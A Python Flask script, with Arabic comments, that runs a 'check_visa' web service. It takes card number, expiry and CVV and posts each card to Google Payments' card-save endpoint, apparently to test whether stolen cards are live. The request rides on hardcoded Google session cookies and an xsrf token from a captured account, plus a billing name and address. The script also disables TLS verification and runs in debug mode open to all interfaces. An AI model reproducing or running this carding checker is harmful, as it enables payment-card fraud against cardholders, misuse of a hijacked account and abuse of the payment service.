from flask import Flask, request, jsonify
import requests
import urllib3

# تعطيل تحذارات SSL غير الضرورية
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route('/check_visa', methods=['GET'])
def check_visa():
    # استقبال بيانات الفيزا من query parameters
    visa_data = request.args.get('visa')
    
    if not visa_data:
        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    try:
        # تقسيم بيانات الفيزا إلى مكوناتها
        card_number, month, year, cvv = visa_data.split('|')
    except ValueError:
        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    # تعريف الكوكيز المحدثة
    cookies = {
        'OTZ': '8178671_44_48_171240_44_319500',
        'AEC': 'AVh_V2iLNQRzcEXTF3vPa7OKyNp7A_CPeLY78RHTg_Y55fBBgXwzH3XI4gk',
        'SID': 'g.a000zgiGj0MNCQtsdJVaFqIpbBRJaG6BXR-TIJQq_y-L7THrdF9y0R8blvBWxyKVop1dB-LzxQACgYKAYsSARYSFQHGX2MiLGRerWAVi4aol_TrV4Pa2BoVAUF8yKpm3t5HfQ1SX7rBLnrASRvR0076',
        '__Secure-1PSID': 'g.a000zgiGj0MNCQtsdJVaFqIpbBRJaG6BXR-TIJQq_y-L7THrdF9y44nJm3Sq45burDbEVibCQwACgYKATsSARYSFQHGX2MibzSUWf0Emc1ltDE0EWKe4hoVAUF8yKrbsxFKV_q8httMZQYRkGaN0076',
        '__Secure-3PSID': 'g.a000zgiGj0MNCQtsdJVaFqIpbBRJaG6BXR-TIJQq_y-L7THrdF9ywMwEqGno5ivmeRFRTS3xgAACgYKAewSARYSFQHGX2Mi3DG7Wu6DbkP5HVi0RKtGAxoVAUF8yKqhAyYujKYCwcjdFEpgv5qt0076',
        'HSID': 'AcT7Y7LrggStXYL37',
        'SSID': 'Akdk-0erb1WOkPTxn',
        'APISID': '-apT3e7qBzYFV8rs/AswNwAUStzhcQQGY0',
        'SAPISID': 'P6ApJxXeYERQg6HZ/AwDn7umN1ACRWNsKx',
        '__Secure-1PAPISID': 'P6ApJxXeYERQg6HZ/AwDn7umN1ACRWNsKx',
        '__Secure-3PAPISID': 'P6ApJxXeYERQg6HZ/AwDn7umN1ACRWNsKx',
        'NID': '525=esAMf4wzYu21EI3xCzuppzebp89JbNNKdH1UwsVzs-5Tya_G2da4gy1ltSVrQXoMil4klwwykc0c3RXMrroao8mARijK-qCxBcwXYN9vHKMla538NIv6HS8ZUgnGljgImmdStqlr_rMFbZBSkh2zmsu3BXs98PFXVoaH5GzvyovQcBSAa9Q43MOg2qqVHq36tEGOGmOvyFYBJCIUCIQK-dsfJQcjlBpYJN7FZBYDIavMFn8Io9G5kGMsmrUF3f_-iYEgFRzGFeCf_8qnmg2Ys5st2f2deIc2_tWzZglb3ORZ7pphWoqr6om30baxNYTNv_19zqaDJxbAOxENMp9qmEaJfN6nNMDEISnoQIap_jecEahnlJUsbm-tZijdGwI7M7qpDlovBrsUAes7BtXvMgv59aDqRskNedflR1KHNjDaDlF9bzAzyC9pLgDyy5iB2GknTGvreECQel_35qxMfPt0U_W10m33hbn-Q4MzrK8LEKxiVlyqoBZcOdNJCZJceuNF1Ax6nuBa-gNzuWIQNp9KVUGGwtCBPeyKW_KnYVW2Oi7do0TNTaV6GKYDNdNL85Db_sydEiVzZRb7l9XiMtFSi1ANG_UyE6q5NjmrUs-LC-hiUHQ1shylaKqlq1UeMZQpxkhVxiVqteNYuUPtlLS1LG-fL9GnrXzzofj2SDwXihcP76tIAINUdSwp61X3GUS9HR_yyLF7oD4kgRnYRFoLCTBEOugBooa-cDzFKLExwhHsrvqdS9KpR6y05Bk7PUBfBaOmEobBoJou9Lvdk5JiPGyc4pGw-d01x82idH0SkiRfAA-QF_gza5SoKfKNweOiCl-anLwEEZVDQ9y640vasFx_fnnL6gzDTdrCXtRscIdni0VeXSvoZcHMYkcvQvJDDA6BHo_HqkgQ2S-iBWNNv3k48BrcHpWoCLZNMel2tXDQ2Dfwkb3EkG0YXYaA6vjfmSBT5ZMtm3zGbPHXG4t-Yxc-UO-tuiSy5gH-jZKIY839tf37j3JA6XKKwcz-gn1w93sfobZSdLIUjcT9HTkptuExaWmNB775WNWZjud2pamMG5TUsoMeHcrXtrc1UCyiJT0EHF9Mt0IcyYfeA11ylvuZNOhGRv0_OmmMDNVP-2BGhUf6X87JWnObGz4',
        '__utma': '207539602.2100594883.1742201890.1753633479.1753641075.4',
        '__utmc': '207539602',
        '__utmz': '207539602.1753641075.4.4.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '__utmt': '1',
        '__utmb': '207539602.3.8.1753641075',
        'S': 'billing-ui-v3=5LksvM5yHJe2JnUcuF7aXJrdkhAffQvu:billing-ui-v3-efe=5LksvM5yHJe2JnUcuF7aXJrdkhAffQvu',
        'SIDCC': 'AKEyXzUmCjkDBoIeUzn1MjLKT0UJCxiyIoVnCqlnhdnkfInjALuOLuHegYe2lY4zB1S9Iw5A2w',
        '__Secure-1PSIDCC': 'AKEyXzWvdGUUC7WdaLjBrS6WRoV-UsV8xjQ_-Nu3Ulw5G0tJzLQFQLwJkGNBgLqV9dQ071eoS5A',
        '__Secure-3PSIDCC': 'AKEyXzX9wPLnze1ZbNSySoD9luy0pFb1-Vscsm4XIFeBYhw7yaAsAFZu8teiJfo1bkdxLRM_VPM',
    }

    # تعريف الهيدرات المحدثة
    headers = {
        'authority': 'payments.google.com',
        'accept': '*/*',
        'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://payments.google.com',
        'referer': 'https://payments.google.com/payments/u/1/embedded/instrument_manager?tc=96%2C87&wst=1753641061750&cst=1753641072042&si=1114862205518669&pet&sri=2&hmi=false&ipi=vlo30z3cgvwp&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_x5knek8h43tc0&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByCmn9iv1Acg9acEYgDAAgD4AwE%3D&spul=500&cori=https%3A%2F%2Fwallet.google.com',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"137.0.7337.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"SM-A307FN"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-client-data': 'CIOJywE=',
        'x-requested-with': 'XmlHttpRequest',
    }

    # تعريف البارامترات المحدثة
    params = {
        'ait': 'GAIA',
        'cn': '$p_x5knek8h43tc0',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': 'vlo30z3cgvwp',
        'hl': 'ar',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': '1114862205518669',
        'style': ':m2',
        'cst': '1753641072042',
        'wst': '1753641061750',
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
        's': '2',
    }

    # تعريف بيانات الطلب المحدثة
    data = {
        'xsrf': 'AJWlU2MJEn7dsK0aJHaTGz-sRa98o6ki1g:1753641074316',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
        'msg': '[[null,"ACo329y1lXWEPIWZoeiUL1cxrSFeS8Kr86BM+u6jSS0DmMAbcMIvj7s+5QqPjBdGUQInOlXliHqwfk4gmkdcdavZXeBGjoHtIw5EMWTHaQL9PVn8+5/Th+tyG4M8ILavH/KpOPUNXvgLMp4GRNgIUGveB7RxNLsiUSAMHFykBJO4THt2VGWOhclz49H8L+BRsVFEUy2DMmi0p+4mBG3cnbHPyijNsZkNzNITUd0ru9+KOql1FGfyUtbycs4/29dCnLxIPx+2LxEm",null,[null,[null,null,null,["!j4yljNTNAAa73VJ7m91CSzkoD4KEDaw7ADQBEArZ1F-pC4Zyrkjah2jruZxLjma7AC0yDI5-GgDoM2VRmHHYtjI5M2qmuOnTcIhA6FnMAgAABiZSAAAAMmgBB34ATJQ0JGinZlcQyHsLnG_unyV-IcodJPqDOCvnv8j7GZxt69W1LzO0nCj6vHYgp0UXbN1O30li2C1niMPwX4oj4Q6BMMs2O0Vdo_Udc0mZCrDnod4StBJbY53v27c66DNw91QEsDy1d9fH3SW-10WfQViVQA6Sai4TyFBLh0E-yFYMq7Bn7tePJmOGhf_V2LKSp5GkRJdlILMTuheAV9vlU0j-U5Lb6zit_G8yLLJcZgpZ4AbwJOZmoV63Q369J4pgv7ROfaQq5iMW6kihAHVUAiAfIeOPvzQnXu70v4hAdoPL3B6Z4h7mJXVmxQGESnWSO57sFwXIS8iooJs2IbKR6ENxquzYAba8rdQfo84pZ1lMBLrP1lzyJ9dGttvZwjt2h4qP2moh2DhfRxsUFXHBIR6ruVUBaXije8juxZf-hxk3GZGt3MZ1U1ULaLHdEblqe4s0bdXMvOEoC12Igy0_AdGdbjRrsqMSWbNY6pOs8yZXhqT4Q1KlYEFZZBOSxXDsgk97Vw_fUBWeo8XKj3wKHUmbMa69ATXfxaMwcC7bYrkzjj6HK-HVJ2gZreO2b9FRB2cd7S6oOtDrvds4iLaYdjtYkaQPZsrJUR6eMnJut4QM5rPiYKkjQ368p9V_9jKUCk1SCQI2HtRXSZP51yM7iReXSTDFbG3Wim3aWnipcXv192jKTfP03f--bklm6hoHuWUzXM5IDw6hHY1qpRznu8pFRMgnjGxhqCoFSE43ljdRZNe9memV3i_RFQd2G9ZAjl7KNVY4vy-pTgBA7n0bMAqU9woOB51tZPliDE_J-xNclTj5CZlX1Vc_xXXhaW9KWefuBbs_o_N92hHE5BVzXntPA9m4iN0uzIHlog5q8oqNA_2MVVniSeVGhdiQ_462qS2hozxpcfG46ua9pIoLwFfe8-uA52fFg-kz4wuK4XuopjtADkUygHnw_DGDKKFv8kaXKX6RUMIeayTVcmfi7xV-FNHA-0-QOQ3XHIiocAxHJoO926qGTUF5PBX54NExQ-aKZ5F95ZAtaJNWw3UpA3knI053_DCVuLy5D-scFQVZ1DNRaguvvVonc0YMlgHGLyMhLkI9HbUVrISqgb7c2S0n3zzobo517oyE8p8FGglkiolPCmW2a15x3zPYYNKfx3yrkGv20MI5JI6K-_LUPVZefBJhuw5ECXPZX-etdusHIHY06oEO7ZRAVq59iByxYpGRxqInrggOw48JRjCGk1CfoYXGfM7m1StoiZOH1LaY1m8A-OoppS2213QzeKubmVLGSB0mHzBZoms2U4vuC8GFJ54I27dprWsOJe4D07I1_D-Oz5rPpjdrojBQ-e1IIuPCx4gukeN-bIx6TK_n8S2l44kzUyySXHjuSeQ8GxtDCgkHEJeU3L_2ragKW2W2jtZUefvYgM8viwk57KGj57USoyLcQc2qeZWaUgchBhZF-oqU0zx9QAVzYvtYr0a4M7y9EJCvNKmKYSFxDY-14dCbjZhV29t0qjXWFv0OrwaIlIcJUHDqidtDbLN36FzeO_rw-F9HfKqlUk7X9ByU9GZtfN2QCdYN9oRnW-ljw4yYaqcWytyCUJjh6_U8XuU1ztRf7uMzArUrE3uxXl4XZp9XOUpyh_cVdFRQ3MTgWJMzoVGLu-YgXUV3Owc-ZycumRpeZaX5ADpxKh1DFfx2L2aEKQNmNsE8MMkT6xNjp1wLBLQ6pnB0NYdjIBzwp6-CH3CHriQIhKehx7HLT9e2bkYmC9o2qsBonVaNbavA40OW7bIcZ3LL-RH0PK8sEJbTPHIZRkv7-JNUp-Y6LSFnZyBS4uz94MnDy-QMMAQtUPf-d4nbhwYZqYB99qRueaUEis9pZe2-p-rPDnMA_XZg-5mSt-nnzuGmpUSyysLb8y3snRv5jaeTDALHQWF3WqXniJliRgePhFMCnVTiJHV9BKiiO7ebNi6aKY_MMwIhXCFnuvs6N2YKbX1nvVdoLAajSq1yK4to3J7iKUXcfQ3TiZ5xn1CxBItZ4ab71aRSpyazexrU27-zCJ3Ywvo0u8JyE5LrCWZDd1Wtag9syDl9nBAVmVsMQP7MFjxR7n8Wrkx3R4pGCnTVmYkAamtMgD7lAQ7NQtx6hGZYIg1Clc9Qs4LkqX1GHie9pg14o5v9dBdLSWLeUTeOQYvpoqrdAQdTILvQKrgq_RDmpb8QK-xg7gQVT7B2XGrlLvCJCtQVhkOl6DTrfC2L9_ds_ND_9bgJb5QJTHyupMHjSJMAvGOXCk8TV2BiA4NhAS8qgRrci3l5iLV6hL9ogX7sz8DYKpm5__ofpVZnJP8sfA-biXLYg1lknfmnXFubKsYDmaEpjT2h-MAxOk1TTPth8ixbKp0raUGmaGI4kpBe2wPG_0xfTBHpSDeOwTwWcjbuq8DFcphRPAOi0MMRb0kIePNwUhFUIqjWNF62YbHWhQ4_Y6lPIXQO24dg-NwVZp98okR-LPkV1yXTLAZoOnZBu736ggeKAMCbdtnI8mjBRCaiaA_L5mxTt4OrsuVV61wEoSnJymJlYrJmUCCrmBHfV5c3kFWbCKv9ZdP-RUJY7g-7X4KB8sou880ZyUqkRizjHVReTArZZoJeyWMRNDvY3FscoW0psoYnPcysECAxYuZJ4TZvWlx3MghWYr_uZVFWLFSKxZ81W0KVbx3R8h3szjqDg7vfBEXumagxWjwSMmfDzv1W-eY9rH96T5qMCP3QwIFLMIaTAIg-QCqdmY35uUjP7eLl6MniGlBo7rtX6R98QTcMAt3kOBuAj4BX1N3xCzR3vnJXN8VmXrB8SsVmAB9QnyYn1apLAmbcvQBUuAm4HK97E6u9DIjzxdnu3aAbEXfTKGrNfw3qGsxoc-D2GtP2KC5Or0yamxrL1OIbbmt31VKPkqoHKDtWVgp3U-VXdzcwykkNtIAfIRwqX3jFbQ_eD74TVhfTH6N5yoideU_BySEYLfZab-NSwA1PDPCaDS8kvTCwqYYd_KJWo32AJD54oHfTq9NAMmM0F7zsrGj6Fhg_qvV4T1orHJ0MEuD6glUrOdPdUSxYB2Wt7p1qDZQVwSvKHV_W-Zjhns4TJkBx7FfbPirXnotGpDeG1edEjTPEdyCvXxzJJhtp22UoGkhC8jDGlHMoYE4-T-sd4e9xpEejBaUMPytDqPo24t_TWrEogEx5XZBhKFK3pAPpd6nxkfcoCm6MYU3D7MCgQDvufKLp2q8ARhQWy3Bj6mOpGtEJsSvMPNFo0kmz1hGcwGSSCq_x-rZfdAnD-QtdX_t-YPrZGpWnh0hSswTmSNwV0k3myddbuvG5m-lyo3_ntL0Z7HCwUmhjRwC_EvCs3142-tpbTSuYCUb-C4wj9JE_9oXEqAHWXb6ErJMjVDrcmJzQQ4wfaeZuGxiZfHf3bJL_qcc45jK0Pigndp3-kZg1vOzJE_yQIeBBYq0JcgNhxA_vAtblNcCl1gTf3kyt-PkkW3kDBNR42tARqUr6r5b3s9k35d8uO5nSPNgZdlRuWFTpI_CykwcpusIZGcm_csWIRun4xW0XKOVT8zlby50Q1O513sZE2IQTQsnzZNgbaza4QT0l0x8iqVtDBDDLwLSPe-9Zn85pn3Q0monrQr-Yfr2qGbNumfgxDzRrieHiU6phsaoRrx83FsIfRQwYab2u-60tZgYoVJAdECRVomrv8hwyG1bvJAJ_u8dbK_FIWNqtA4WbtE6NzFbeDEYUnie_SxOmoyDKbOsrs_P3nM_qWjOdg-A"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",1,2030,null,"4966",null,"__s7e_data__61bb463a","Mia Reid",[["US",null,"TX",null,"Plano",null,null,null,null,null,null,"75074",null,["098 Fairwood Village","Oisoddn"]],null,null,null,"billingAddress",null,"CggIxLmJwwIQAQ==",2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,3,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,1,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 2028KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,0,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 2028Linux3b Android 103b K29 AppleWebKit2f537.36 2028KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 0023a003a00 GMT2b0200 20282a48424a2a 20343142 20234831482827 2027443133454a29,770c67fc,1,7:a21,3,1984d273c7b,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2c4:a40,"f,1984d273f3f,"n,0,0,"t,1984d273618,0,0,0,0,1984d273624,1984d273624,1984d273624,1984d273624,1984d273624,0,1984d273636,1984d273a30,1984d273a4f,1984d273a51,1984d273cb7,1984d273cb8,1984d273f87,1984d2742c7,1984d2742c8,1984d2742fa:a10:a31,3,"h,1,"p,63,34,"m,3bae,5c2,1a0f,1a77,5962,1146,6f81,653,32b,15eb,56e,bee,f57,9b9,2b3e,a75,19c7,b6c,1a6a'
    }

    try:
        # إضافة جلسة مع إعدادات أفضل للاتصال
        session = requests.Session()
        session.verify = False  # تعطيل التحقق من SSL (لأغراض الاختبار فقط)
        session.headers.update(headers)
        
        # إرسال الطلب مع إعدادات متقدمة
        response = session.post(
            'https://payments.google.com/efe/payments/u/1/instrument_manager_save_page',
            params=params,
            cookies=cookies,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        # إرجاع الاستجابة كـ JSON
        return jsonify({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'content': response.text
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'error': str(e),
            'message': 'فشل في الاتصال بخادم جوجل. يرجى التحقق من اتصال الإنترنت أو تحديث الكوكيز والهيدرات.'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
